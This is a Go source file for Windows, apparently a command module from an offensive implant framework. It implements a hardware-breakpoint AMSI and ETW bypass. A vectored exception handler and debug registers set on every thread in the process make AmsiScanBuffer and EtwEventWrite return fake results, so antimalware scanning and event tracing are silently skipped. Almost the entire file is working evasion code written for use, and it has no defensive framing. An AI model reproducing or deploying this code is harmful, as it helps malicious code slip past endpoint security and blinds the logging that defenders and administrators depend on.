//go:build windows
// +build windows

package commands

import (
	"fmt"
	"runtime"
	"sync"
	"syscall"
	"unsafe"
)

// Hardware breakpoint Windows API procs (kernel32 is declared in vanillainjection.go)
var (
	procAddVectoredExceptionHandler = kernel32.NewProc("AddVectoredExceptionHandler")
	procGetCurrentProcessId         = kernel32.NewProc("GetCurrentProcessId")
	procGetCurrentThreadId          = kernel32.NewProc("GetCurrentThreadId")
	procSuspendThread               = kernel32.NewProc("SuspendThread")
	procSetThreadContext            = kernel32.NewProc("SetThreadContext")
	procGetThreadContext            = kernel32.NewProc("GetThreadContext")
)

// Hardware breakpoint constants
const (
	CONTEXT_AMD64_FLAG      = 0x00100000
	CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64_FLAG | 0x0010
	CONTEXT_ALL_FLAGS       = CONTEXT_AMD64_FLAG | 0x001F

	STATUS_SINGLE_STEP           = 0x80000004
	EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF // -1 as uint32
	EXCEPTION_CONTINUE_SEARCH    = 0x0

	INFINITE = 0xFFFFFFFF
)

// M128A represents a 128-bit value for the CONTEXT FPU/vector area
type M128A struct {
	Low  uint64
	High uint64
}

// CONTEXT_AMD64 is the x64 CONTEXT structure (1232 bytes) used by
// GetThreadContext/SetThreadContext. Fields are laid out to match the
// Windows SDK definition exactly.
type CONTEXT_AMD64 struct {
	P1Home       uint64
	P2Home       uint64
	P3Home       uint64
	P4Home       uint64
	P5Home       uint64
	P6Home       uint64
	ContextFlags uint32
	MxCsr        uint32
	SegCs        uint16
	SegDs        uint16
	SegEs        uint16
	SegFs        uint16
	SegGs        uint16
	SegSs        uint16
	EFlags       uint32
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr6          uint64
	Dr7          uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
	FltSave      [512]byte
	VectorReg    [26]M128A
	VectorCtl    uint64
	DebugCtl     uint64
	LBrTo        uint64
	LBrFrom      uint64
	LExTo        uint64
	LExFrom      uint64
}

// EXCEPTION_RECORD is the Windows EXCEPTION_RECORD structure for x64
type EXCEPTION_RECORD struct {
	ExceptionCode    uint32
	ExceptionFlags   uint32
	ExceptionRecord  *EXCEPTION_RECORD
	ExceptionAddress uintptr
	NumberParameters uint32
	_                [4]byte // padding for x64 alignment
	ExceptionInfo    [15]uintptr
}

// EXCEPTION_POINTERS is passed to the VEH callback
type EXCEPTION_POINTERS struct {
	ExceptionRecord *EXCEPTION_RECORD
	ContextRecord   *CONTEXT_AMD64
}

// Global state for hardware breakpoint VEH handler
var (
	hwbpMutex     sync.Mutex
	hwbpInstalled bool
	hwbpAmsiAddr  uintptr // Address of AmsiScanBuffer (0 = not set)
	hwbpEtwAddr   uintptr // Address of EtwEventWrite (0 = not set)
)

// vehHandler is the Vectored Exception Handler callback that intercepts
// hardware breakpoint exceptions and modifies execution to bypass the
// target function (AMSI or ETW).
func vehHandler(exceptionInfo *EXCEPTION_POINTERS) uintptr {
	if exceptionInfo.ExceptionRecord.ExceptionCode != STATUS_SINGLE_STEP {
		return EXCEPTION_CONTINUE_SEARCH
	}

	ctx := exceptionInfo.ContextRecord

	// Check if we hit the AMSI breakpoint (Dr0)
	if hwbpAmsiAddr != 0 && uintptr(ctx.Rip) == hwbpAmsiAddr {
		// Return E_INVALIDARG (0x80070057) - makes CLR skip AMSI check
		ctx.Rax = 0x80070057
		// Pop return address from stack into RIP (simulate RET)
		retAddr := *(*uint64)(unsafe.Pointer(uintptr(ctx.Rsp)))
		ctx.Rip = retAddr
		ctx.Rsp += 8
		// Re-enable the breakpoint by clearing Dr6
		ctx.Dr6 = 0
		return EXCEPTION_CONTINUE_EXECUTION
	}

	// Check if we hit the ETW breakpoint (Dr1)
	if hwbpEtwAddr != 0 && uintptr(ctx.Rip) == hwbpEtwAddr {
		// Return STATUS_SUCCESS (0) - silently skip ETW event write
		ctx.Rax = 0
		// Pop return address from stack into RIP (simulate RET)
		retAddr := *(*uint64)(unsafe.Pointer(uintptr(ctx.Rsp)))
		ctx.Rip = retAddr
		ctx.Rsp += 8
		// Re-enable the breakpoint by clearing Dr6
		ctx.Dr6 = 0
		return EXCEPTION_CONTINUE_EXECUTION
	}

	return EXCEPTION_CONTINUE_SEARCH
}

// resolveFunctionAddress loads a DLL and returns the address of the specified function.
func resolveFunctionAddress(dllName, funcName string) (uintptr, error) {
	dll, err := syscall.LoadDLL(dllName)
	if err != nil {
		return 0, fmt.Errorf("failed to load %s: %v", dllName, err)
	}
	proc, err := dll.FindProc(funcName)
	if err != nil {
		return 0, fmt.Errorf("failed to find %s in %s: %v", funcName, dllName, err)
	}
	return proc.Addr(), nil
}

// setThreadDebugRegisters suspends the thread, sets Dr0/Dr1/Dr7 via
// GetThreadContext/SetThreadContext, then resumes it.
func setThreadDebugRegisters(hThread uintptr, dr0, dr1, dr7 uint64) error {
	// Suspend the thread
	ret, _, err := procSuspendThread.Call(hThread)
	if int32(ret) == -1 {
		return fmt.Errorf("SuspendThread failed: %v", err)
	}

	// Get thread context (only debug registers)
	var ctx CONTEXT_AMD64
	ctx.ContextFlags = CONTEXT_ALL_FLAGS

	ret, _, err = procGetThreadContext.Call(
		hThread,
		uintptr(unsafe.Pointer(&ctx)),
	)
	if ret == 0 {
		// Resume even if get failed
		procResumeThread.Call(hThread)
		return fmt.Errorf("GetThreadContext failed: %v", err)
	}

	// Set debug registers
	if dr0 != 0 {
		ctx.Dr0 = dr0
	}
	if dr1 != 0 {
		ctx.Dr1 = dr1
	}
	ctx.Dr7 = dr7
	ctx.Dr6 = 0 // Clear debug status
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS

	ret, _, err = procSetThreadContext.Call(
		hThread,
		uintptr(unsafe.Pointer(&ctx)),
	)
	if ret == 0 {
		procResumeThread.Call(hThread)
		return fmt.Errorf("SetThreadContext failed: %v", err)
	}

	// Resume the thread
	procResumeThread.Call(hThread)
	return nil
}

// SetupHardwareBreakpoints registers a VEH and sets hardware breakpoints on
// the specified function addresses across all threads in the current process.
// amsiAddr is set in Dr0, etwAddr is set in Dr1.
func SetupHardwareBreakpoints(amsiAddr, etwAddr uintptr) (string, error) {
	hwbpMutex.Lock()
	defer hwbpMutex.Unlock()

	// Pin the calling goroutine to its OS thread so GetCurrentThreadId is stable
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var output string

	// Store target addresses for the VEH handler
	hwbpAmsiAddr = amsiAddr
	hwbpEtwAddr = etwAddr

	// Register VEH if not already done
	if !hwbpInstalled {
		cb := syscall.NewCallback(vehHandler)
		handle, _, err := procAddVectoredExceptionHandler.Call(1, cb)
		if handle == 0 {
			return "", fmt.Errorf("AddVectoredExceptionHandler failed: %v", err)
		}
		hwbpInstalled = true
		output += "[+] Vectored Exception Handler registered\n"
	} else {
		output += "[*] VEH already registered, updating breakpoint addresses\n"
	}

	// Build Dr7 value
	var dr7 uint64
	if amsiAddr != 0 {
		dr7 |= 1 // Local enable Dr0 (bit 0) - execution breakpoint
		// Condition bits 16-17 = 00 (execution), Length bits 18-19 = 00 (1 byte) -- already 0
	}
	if etwAddr != 0 {
		dr7 |= (1 << 2) // Local enable Dr1 (bit 2) - execution breakpoint
		// Condition bits 20-21 = 00 (execution), Length bits 22-23 = 00 (1 byte) -- already 0
	}

	// Get current PID and TID
	currentPID, _, _ := procGetCurrentProcessId.Call()
	currentTID, _, _ := procGetCurrentThreadId.Call()
	output += fmt.Sprintf("[*] Current PID: %d, TID: %d\n", currentPID, currentTID)

	// Enumerate all threads in the process via CreateToolhelp32Snapshot
	// (procCreateToolhelp32Snapshot, procThread32First, procThread32Next, THREADENTRY32
	//  and TH32CS_SNAPTHREAD are declared in ts.go in the same package)
	snapshot, _, err := procCreateToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPTHREAD), 0)
	if snapshot == uintptr(^uintptr(0)) { // INVALID_HANDLE_VALUE
		return output, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer procCloseHandle.Call(snapshot)

	var entry THREADENTRY32
	entry.Size = uint32(unsafe.Sizeof(entry))

	patchedCount := 0

	ret, _, err := procThread32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return output, fmt.Errorf("Thread32First failed: %v", err)
	}

	for {
		if uintptr(entry.OwnerProcessID) == currentPID && uintptr(entry.ThreadID) != currentTID {
			// Open handle to this thread
			hThread, _, _ := procOpenThread.Call(
				uintptr(THREAD_SET_CONTEXT|THREAD_GET_CONTEXT|THREAD_SUSPEND_RESUME),
				0,
				uintptr(entry.ThreadID),
			)
			if hThread != 0 {
				if err := setThreadDebugRegisters(hThread, uint64(amsiAddr), uint64(etwAddr), dr7); err != nil {
					output += fmt.Sprintf("[-] Failed to patch TID %d: %v\n", entry.ThreadID, err)
				} else {
					patchedCount++
				}
				procCloseHandle.Call(hThread)
			}
		}

		// Reset entry size for next iteration
		entry.Size = uint32(unsafe.Sizeof(entry))
		ret, _, _ = procThread32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}

	output += fmt.Sprintf("[+] Patched %d threads with debug registers\n", patchedCount)

	// Patch the current thread using a helper goroutine on a separate OS thread
	hCurrentThread, _, _ := procOpenThread.Call(
		uintptr(THREAD_SET_CONTEXT|THREAD_GET_CONTEXT|THREAD_SUSPEND_RESUME),
		0,
		currentTID,
	)
	if hCurrentThread == 0 {
		output += "[-] Warning: Could not open handle to current thread for HWBP\n"
	} else {
		done := make(chan error, 1)
		go func() {
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()
			done <- setThreadDebugRegisters(hCurrentThread, uint64(amsiAddr), uint64(etwAddr), dr7)
		}()
		if err := <-done; err != nil {
			output += fmt.Sprintf("[-] Failed to patch current thread: %v\n", err)
		} else {
			output += "[+] Patched current thread with debug registers\n"
		}
		procCloseHandle.Call(hCurrentThread)
	}

	output += "[+] Hardware breakpoint setup complete\n"
	return output, nil
}
